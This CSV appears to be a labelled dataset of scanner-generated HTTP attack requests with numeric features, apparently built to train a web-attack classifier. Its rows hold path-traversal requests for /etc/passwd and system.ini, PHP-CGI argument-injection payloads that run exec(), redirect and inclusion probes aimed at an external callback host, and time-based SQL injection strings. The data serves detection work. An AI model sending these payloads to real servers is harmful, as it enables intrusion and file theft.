method,path,body,single_q,double_q,dashes,braces,spaces,percentages,semicolons,angle_brackets,special_chars,path_length,body_length,badwords_count,class
GET,/default.jsp?content=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini,,0,0,0,0,0,0,0,0,0,87,0,1,1
POST,/sendFeedback,cfile=%2Fetc%2Fpasswd&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,123,0,1
GET,/images/index.jsp?content=c%3A%2FWindows%2Fsystem.ini,,0,0,0,0,0,0,0,0,0,47,0,1,1
GET,/Documents/JohnSmith/index.jsp?content=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini,,0,0,0,0,0,0,0,0,0,105,0,1,1
GET,/default.jsp?content=c%3A%5CWindows%5Csystem.ini,,0,0,0,0,0,0,0,0,0,42,0,1,1
GET,/Privacypolicy.jsp?sec=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini&template=US,,0,0,0,0,0,0,0,0,0,101,0,1,1
POST,/sendFeedback,cfile=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,170,0,1
GET,/disclaimer.htm?url=c%3A%5CWindows%5Csystem.ini,,0,0,0,0,0,0,0,0,0,41,0,1,1
GET,/images/index.jsp?content=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini,,0,0,0,0,0,0,0,0,0,92,0,1,1
GET,/my%20documents,,0,0,0,0,1,0,0,0,0,13,0,0,1
GET,/index.jsp?content=c%3A%2FWindows%2Fsystem.ini,,0,0,0,0,0,0,0,0,0,40,0,1,1
GET,/Documents/JohnSmith/index.jsp?content=%2Fetc%2Fpasswd,,0,0,0,0,0,0,0,0,0,50,0,0,1
GET,/index.jsp?content=c%3A%2FWindows%2Fsystem.ini&job=MortgageLendingAccountExecutive%3ASales,,0,0,0,0,0,0,0,0,0,82,0,1,1
POST,/doLogin,uid=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini&passw=ZAP&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,96,2,1
POST,/doSubscribe,txtEmail=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini&btnSubmit=Subscribe,0,0,0,0,0,0,0,0,0,12,95,1,1
POST,/sendFeedback,cfile=c%3A%2F&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,115,0,1
GET,/my%20documents/JohnSmith,,0,0,0,0,1,0,0,0,0,23,0,0,1
POST,/static/cgi.exe?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('cmd.exe /C echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,8,0,3,2,0,71,86,0,1
POST,/static/index.jsp?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('cmd.exe /C echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,8,0,3,2,0,73,86,0,1
POST,/static?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('cmd.exe /C echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,8,0,3,2,0,63,86,0,1
POST,/static/personal_savings.htm?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('cmd.exe /C echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,8,0,3,2,0,84,86,0,1
POST,/static/subscribe.jsp?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('cmd.exe /C echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,8,0,3,2,0,77,86,0,1
POST,/retirement.htm?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,6,0,3,2,0,71,75,0,1
POST,/sameDomain?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,6,0,3,2,0,67,75,0,1
POST,/sitemap.xml?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,6,0,3,2,0,68,75,0,1
POST,/security.htm?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,6,0,3,2,0,69,75,0,1
POST,/static/personal_savings.htm?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,6,0,3,2,0,84,75,0,1
POST,/static/cgi.exe?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,6,0,3,2,0,71,75,0,1
POST,/pr/communityannualreport.pdf?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,6,0,3,2,0,85,75,0,1
POST,/static/subscribe.jsp?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,6,0,3,2,0,77,75,0,1
POST,/static?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,6,0,3,2,0,63,75,0,1
POST,/status_check.jsp?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,6,0,3,2,0,73,75,0,1
POST,/static/index.jsp?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,6,0,3,2,0,73,75,0,1
POST,/subscribe.jsp?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('cmd.exe /C echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,8,0,3,2,0,70,86,0,1
POST,/subscribe.swf?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('cmd.exe /C echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,8,0,3,2,0,70,86,0,1
POST,/survey_questions.jsp?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('cmd.exe /C echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,8,0,3,2,0,77,86,0,1
POST,/survey_questions.jsp?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,6,0,3,2,0,77,75,0,1
POST,/subscribe.jsp?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,6,0,3,2,0,70,75,0,1
POST,/swagger?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('cmd.exe /C echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,8,0,3,2,0,64,86,0,1
POST,/swagger/index.html?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('cmd.exe /C echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,8,0,3,2,0,75,86,0,1
POST,/swagger/swagger-ui-bundle.js?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('cmd.exe /C echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,8,0,3,2,0,85,86,0,1
POST,/subscribe.swf?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,6,0,3,2,0,70,75,0,1
POST,/swagger/swagger-ui-standalone-preset.js?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('cmd.exe /C echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,8,0,3,2,0,96,86,0,1
POST,/swagger?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,6,0,3,2,0,64,75,0,1
POST,/swagger/index.html?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,6,0,3,2,0,75,75,0,1
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=5%3BURL%3D%27https%3A%2F%2F6542095270498749340.owasp.org%27,2,0,0,0,0,0,1,0,0,8,73,1,1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=URL%3D%27http%3A%2F%2F6542095270498749340.owasp.org%27&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,2,0,0,0,7,0,0,0,0,13,163,0,1
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=URL%3D%27http%3A%2F%2F6542095270498749340.owasp.org%27,2,0,0,0,0,0,0,0,0,8,70,1,1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=http%3A%2F%2F%5C6542095270498749340.owasp.org&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,158,0,1
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=http%3A%2F%2F%5C6542095270498749340.owasp.org,0,0,0,0,0,0,0,0,0,8,65,1,1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=https%3A%2F%2F%5C6542095270498749340.owasp.org&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,159,0,1
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=https%3A%2F%2F%5C6542095270498749340.owasp.org,0,0,0,0,0,0,0,0,0,8,66,1,1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=%2F%2F6542095270498749340.owasp.org&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,152,0,1
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=%2F%2F6542095270498749340.owasp.org,0,0,0,0,0,0,0,0,0,8,59,1,1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=6542095270498749340.owasp.org&comments=&submit=+Submit+,0,0,0,0,2,0,0,0,0,13,106,0,1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=http%3A%2F%2F6542095270498749340.owasp.org&comments=&submit=+Submit+,0,0,0,0,2,0,0,0,0,13,113,0,1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=https%3A%2F%2F6542095270498749340.owasp.org&comments=&submit=+Submit+,0,0,0,0,2,0,0,0,0,13,114,0,1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=https%3A%2F%2F6542095270498749340%252eowasp%252eorg&comments=&submit=+Submit+,0,0,0,0,2,0,0,0,0,13,118,0,1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=5%3BURL%3D%27https%3A%2F%2F6542095270498749340.owasp.org%27&comments=&submit=+Submit+,2,0,0,0,2,0,1,0,0,13,122,0,1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=URL%3D%27http%3A%2F%2F6542095270498749340.owasp.org%27&comments=&submit=+Submit+,2,0,0,0,2,0,0,0,0,13,119,0,1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=http%3A%2F%2F%5C6542095270498749340.owasp.org&comments=&submit=+Submit+,0,0,0,0,2,0,0,0,0,13,114,0,1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=6542095270498749340.owasp.org,,0,0,0,0,3,0,0,0,0,91,0,0,1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=https%3A%2F%2F%5C6542095270498749340.owasp.org&comments=&submit=+Submit+,0,0,0,0,2,0,0,0,0,13,115,0,1
GET,/search.jsp?query=6542095270498749340.owasp.org,,0,0,0,0,0,0,0,0,0,47,0,0,1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=http%3A%2F%2F6542095270498749340.owasp.org,,0,0,0,0,3,0,0,0,0,98,0,0,1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=%2F%2F6542095270498749340.owasp.org&comments=&submit=+Submit+,0,0,0,0,2,0,0,0,0,13,108,0,1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=https%3A%2F%2F6542095270498749340.owasp.org,,0,0,0,0,3,0,0,0,0,99,0,0,1
GET,/search.jsp?query=http%3A%2F%2F6542095270498749340.owasp.org,,0,0,0,0,0,0,0,0,0,54,0,0,1
GET,/survey_questions.jsp?step=6542095270498749340.owasp.org,,0,0,0,0,0,0,0,0,0,56,0,0,1
GET,/static/index.jsp?content=6542095270498749340.owasp.org,,0,0,0,0,0,0,0,0,0,55,0,0,1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=6542095270498749340.owasp.org&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,153,0,1
GET,/search.jsp?query=https%3A%2F%2F6542095270498749340.owasp.org,,0,0,0,0,0,0,0,0,0,55,0,0,1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=https%3A%2F%2F6542095270498749340%252eowasp%252eorg,,0,0,0,0,3,0,0,0,0,103,0,0,1
GET,/static/index.jsp?content=http%3A%2F%2F6542095270498749340.owasp.org,,0,0,0,0,0,0,0,0,0,62,0,0,1
GET,/survey_questions.jsp?step=http%3A%2F%2F6542095270498749340.owasp.org,,0,0,0,0,0,0,0,0,0,63,0,0,1
GET,/search.jsp?query=https%3A%2F%2F6542095270498749340%252eowasp%252eorg,,0,0,0,0,0,0,0,0,0,59,0,0,1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=5%3BURL%3D%27https%3A%2F%2F6542095270498749340.owasp.org%27,,2,0,0,0,3,0,1,0,0,107,0,0,1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=http%3A%2F%2F6542095270498749340.owasp.org&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,160,0,1
GET,/static/index.jsp?content=https%3A%2F%2F6542095270498749340.owasp.org,,0,0,0,0,0,0,0,0,0,63,0,0,1
GET,/Privacypolicy.jsp?sec=Careers%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+&template=US,,5,2,1,2,17,0,0,0,0,206,0,4,1
GET,/images/index.jsp?content=personal.htm%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22,,0,4,0,1,4,0,0,0,0,77,0,1,1
GET,/disclaimer.htm?url=http%3A%2F%2Fwww.netscape.com+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,4,2,1,2,17,0,0,0,0,206,0,4,1
GET,/index.jsp?content=inside_volunteering.htm%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22,,0,4,0,1,4,0,0,0,0,81,0,1,1
GET,/Documents/JohnSmith/index.jsp?content=personal.htm%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,5,2,1,2,17,0,0,0,0,215,0,4,1
GET,/survey_questions.jsp?step=%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,5,2,1,1,14,0,1,0,0,178,0,4,1
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,4,3,1,1,14,0,1,0,0,12,174,4,1
POST,/sendFeedback,cfile=comments.txt&name=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,4,3,1,1,21,0,1,0,0,13,272,4,1
POST,/doLogin,uid=ZAP&passw=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&btnSubmit=Login,4,3,1,1,14,0,1,0,0,8,181,5,1
GET,/search.jsp?query=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,2,1,1,14,0,1,0,0,169,0,4,1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=%22java.lang.Thread.sleep%22%2815000%29,,0,2,0,1,3,0,0,0,0,93,0,1,1
GET,/static/index.jsp?content=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,3,1,1,14,0,1,0,0,177,0,4,1
GET,/images/index.jsp?content=personal.htm+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,4,2,1,2,17,0,0,0,0,201,0,4,1
GET,/Privacypolicy.jsp?sec=Careers&template=%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,2,1,1,14,0,1,0,0,190,0,4,1
GET,/index.jsp?content=inside_jobs.htm+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+&job=MortgageLendingAccountExecutive%3ASales,,4,2,1,2,17,0,0,0,0,239,0,4,1
GET,/disclaimer.htm?url=http%3A%2F%2Fwww.netscape.com%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,5,2,1,2,17,0,0,0,0,207,0,4,1
GET,/survey_questions.jsp?step=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,,4,3,1,1,14,0,1,0,0,178,0,4,1
GET,/index.jsp?content=inside_volunteering.htm+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,4,2,1,2,17,0,0,0,0,205,0,4,1
POST,/sendFeedback,cfile=comments.txt&name=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,4,2,1,1,21,0,1,0,0,13,272,4,1
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,4,2,1,1,14,0,1,0,0,12,174,4,1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=personal_checking.htm+%2F+%22java.lang.Thread.sleep%22%2815000%29+,,0,2,0,1,6,0,0,0,0,118,0,1,1
